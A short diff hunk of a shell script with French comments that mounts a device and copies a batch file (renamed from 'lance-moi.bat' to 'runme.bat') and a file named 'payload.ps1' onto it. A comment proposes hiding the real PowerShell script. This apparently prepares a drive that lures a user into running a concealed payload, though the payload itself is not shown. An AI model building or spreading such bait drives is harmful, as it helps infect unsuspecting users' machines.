@@ -15,7 +15,7 @@ sudo mkdir -p "$MOUNT_POINT"
 sudo mount $DEVICE $MOUNT_POINT
 
 echo "[*] Copie du payload..."
-sudo cp lance-moi.bat "$MOUNT_POINT/"
+sudo cp runme.bat "$MOUNT_POINT/"
 sudo cp payload.ps1 "$MOUNT_POINT/"
 
 # Optionnel : cacher le vrai script PowerShell
